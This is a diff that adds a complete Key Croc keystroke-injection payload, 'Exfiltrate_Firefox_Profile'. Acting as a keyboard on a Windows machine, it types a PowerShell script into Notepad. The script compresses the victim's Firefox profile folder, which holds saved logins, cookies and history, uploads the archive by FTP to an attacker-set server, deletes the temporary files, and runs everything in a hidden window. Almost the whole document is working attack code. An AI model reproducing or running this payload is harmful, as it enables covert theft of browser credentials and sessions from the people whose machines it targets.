@@ -1,0 +1,51 @@
+# Title:           Exfiltrate_Firefox_Profile
+# Description:     Exfiltrate Firefox Profile folder via
+#                  FTP server
+# Author:          MarkB
+# Version:         1.0
+# Category:        Key Croc
+
+# Config parameters
+serveradr="111.222.33.44"     # Server IP or domain
+username="ftpuser"            # FTP username
+password="secretpasswd"       # FTP password
+
+# WRITE SRCIPT
+sleep 10
+LED M
+ATTACKMODE HID
+QUACK GUI r
+sleep 1
+QUACK STRING "notepad.exe"
+QUACK ENTER
+sleep 2
+QUACK STRING "Compress-Archive -Path \"\$(\$env:LOCALAPPDATA)\\Mozilla\\Firefox\\Profiles\\\" -CompressionLevel \"Fastest\" -DestinationPath \"\$(\$env:TEMP)\\ff.zip\""
+QUACK ENTER
+QUACK STRING "\$client = New-Object System.Net.WebClient"
+QUACK ENTER
+QUACK STRING "\$client.Credentials = New-Object System.Net.NetworkCredential(\"$username\", \"$password\")"
+QUACK ENTER
+QUACK STRING "\$client.UploadFile(\"ftp://$serveradr/ff.zip\", \"\$(\$env:TEMP)\\ff.zip\")"
+QUACK ENTER
+QUACK STRING "rm \"\$(\$env:TEMP)\\ff.zip\""
+QUACK ENTER
+QUACK STRING "rm \"\$(\$env:TEMP)\\e.ps1\""
+QUACK ENTER
+QUACK CTRL s
+sleep 1
+QUACK STRING "%TEMP%\\e.ps1"
+QUACK TAB
+QUACK DOWN
+QUACK DOWN
+QUACK ENTER
+QUACK ENTER
+sleep 1
+QUACK ALT F4
+sleep 1
+
+# EXECUTE SCRIPT IN HIDDEN WINDOW
+QUACK GUI r
+sleep 1
+QUACK STRING "powershell.exe -windowstyle Hidden %TEMP%\\e.ps1"
+QUACK ENTER
+LED OFF
